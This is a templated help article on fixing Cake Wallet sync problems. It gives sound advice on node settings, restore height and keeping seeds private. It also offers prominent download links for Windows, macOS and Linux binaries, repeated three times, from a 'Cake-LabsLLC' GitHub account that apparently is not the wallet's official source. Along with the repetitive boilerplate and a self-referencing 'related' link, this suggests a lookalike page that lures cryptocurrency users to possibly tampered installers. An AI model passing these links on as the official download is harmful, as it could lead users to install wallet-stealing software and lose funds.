<p align="center"><img src="https://github.com/Cake-LabsLLC/learn/raw/HEAD/assets/banner-article.png" alt="Cake Wallet article banner" width="100%"></p>

<h1 align="center">Troubleshoot Cake Wallet not syncing | Cake Wallet</h1>
<p align="center">Practical, private steps for resolving this Cake Wallet question.</p>

<p align="center">
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe"><img src="https://img.shields.io/badge/Download_for_Windows-2B2733?style=for-the-badge&logo=windows&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Windows"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-2B2733?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for macOS"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip"><img src="https://img.shields.io/badge/Download_for_Linux-2B2733?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe) | v6.5.1 |
| macOS | [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg) | v6.5.1 |
| Linux | [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip) | v6.5.1 |

All versions and checksums are on the [Cake Wallet v6.5.1 release page](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1).

## Short answer

A wallet that is still scanning may show incomplete or stale information. Give it time, check basic connectivity and node settings, and use a suitable restore height.

## You'll see this if

- The sync indicator appears stalled, balances do not update, or recent activity is missing. The issue may appear after restoring, changing networks, or reopening the app.
- You are unsure which safe troubleshooting step to try next.
- You want to protect wallet recovery information while resolving the issue.

## Why it happens

Wallet scanning depends on connecting to a node and processing blockchain history. A connection problem, node availability, or a restore height that starts too late can affect what the app displays. Restore height is the block height to start scanning; earlier is safer for finding older activity but takes longer.

## Fix

1. Check that the device has a working internet connection and that other ordinary network activity works. Restarting the app can help distinguish a temporary interruption.
2. Allow enough time for scanning, especially after a fresh restore or when using an earlier restore height. Avoid repeatedly changing settings while a scan is in progress.
3. Review the app’s node settings in general terms. If you changed a node, return to a known working configuration offered by the app rather than entering an address from an untrusted message.
4. Check whether the restore height could be later than the wallet’s earlier activity. An earlier height scans more history and is safer when uncertain, though it takes longer.
5. Restart the wallet and observe whether its sync state progresses. Note the non-secret error text if the problem persists.
6. See [Cake Wallet node settings guidance](./cake-wallet-node-settings.md) and the official [Cake Wallet desktop repository](https://github.com/Cake-LabsLLC/cake-wallet-desktop).

> [!TIP]
> Keep a written record of non-secret troubleshooting details. Never include seed words, keys, PINs, or recovery screenshots in that record.

If restoring, review [Cake Wallet restore height](./cake-wallet-restore-height.md) and its [node settings guide](./cake-wallet-node-settings.md).

For another perspective, read the [Cake Wallet related guide](./cake-wallet-sync-slow.md).

---

## If that did not work

If syncing remains stalled, avoid deleting the wallet or its data until you have a verified recovery backup. Record what you changed and revert only settings you recognize. Do not enter seed words into a node or send them to anyone offering to speed up synchronization. If a restored wallet appears empty, compare restore height and allow the scan to finish before drawing conclusions.

A few careful checks can make this process less confusing. First separate wallet access from recovery: a PIN or a desktop launch issue is not the same thing as seed validity, and node connectivity is not a substitute for recovery details. Write down the non-secret symptoms you observe, such as the wording of an error, whether the app opens, or whether scanning advances. This helps you compare behavior without exposing private information.

Avoid making several changes at once. If you change a restore option, node setting, or installation state, you may not know which change affected the result. Where practical, note the original non-secret setting before changing it. Give scans time to complete, particularly after a restore that starts earlier in the blockchain. A longer scan is not necessarily evidence that the wallet or backup is broken.

Protect yourself from recovery scams throughout troubleshooting. A person who asks you to reveal a seed, private key, PIN, or recovery screenshot is asking for information that should remain yours. Do not use a site or chat as a seed checker. Official-looking language does not make an unsolicited request safe. Keep the words out of email, shared documents, and screen recordings.

If you need to change devices or installations, plan the recovery first. Keep the existing app and its data intact until you have confirmed that you can restore from your own backup. Cake Wallet can restore a MyMonero seed, including the 13-word MyMonero-specific legacy format or the 25-word standard Monero format. Newer wallets may use a different seed format; check the word count your backup shows. Do not combine formats or guess missing words.

Use the linked guides as background, not as a reason to disclose any secret. They describe adjacent topics such as recovery, synchronization, privacy, and migration. Menu wording can vary, so follow the general options presented in your own app rather than searching for an exact label that may not appear. If a troubleshooting step would require surrendering control of your device or revealing recovery information, stop and choose a safer route.

A successful check should leave you with a clear distinction between what you know and what remains uncertain. For example, you can confirm that a backup has a particular word count without publishing the words, or note that a sync indicator has not moved without sending a screen image containing keys. Keep that distinction in mind when asking for general help.


> [!WARNING]
> A seed or private key can provide control of a wallet. Never send it to support, enter it on a website, or disclose it to someone offering to recover funds.

See [another Cake Wallet help article](./cake-wallet-not-syncing.md) for related guidance.

## Prevention

Use the app’s ordinary settings and trusted connection options. Keep the app updated from the official project release source, and avoid nodes or configuration instructions from unsolicited messages. Back up recovery information privately before major changes. Never share a seed to diagnose a sync issue; a node does not need your seed.



---

## FAQ

<details><summary>Should I share my seed with support?</summary>

No. Nobody legitimate asks for your seed, keys, or PIN. Keep recovery information private and enter it only in the genuine app when needed.

</details>

<details><summary>Does a PIN replace my recovery backup?</summary>

No. A PIN protects access on an installation. Keep a separate, complete recovery backup in a private place.

</details>

<details><summary>Can I use a MyMonero seed?</summary>

Cake Wallet can restore a MyMonero seed. MyMonero used a 13-word MyMonero-specific legacy seed or a 25-word standard Monero seed.

</details>

<details><summary>What if the wallet looks empty after recovery?</summary>

Allow scanning to finish and check the restore height. An earlier height can find older activity but takes longer to scan.

</details>

---

## Download Cake Wallet Desktop

- Windows: [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe)
- macOS: [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg)
- Linux: [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip)

Check each file against the checksums on the [Cake Wallet v6.5.1 release](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [Review node settings in Cake Wallet | Cake Wallet](./cake-wallet-node-settings.md) | Practical, private steps for resolving this Cake Wallet question. |
| [Troubleshoot Cake Wallet desktop not opening | Cake Wallet](./cake-wallet-app-not-opening.md) | Practical, private steps for resolving this Cake Wallet question. |
| [Cake Wallet on macOS Cannot Be Opened](./cake-wallet-macos-cannot-be-opened.md) | Resolve a macOS warning carefully by checking the download source, then opening the app deliberately. |

[Back to all Cake Wallet guides](https://github.com/Cake-LabsLLC/learn)
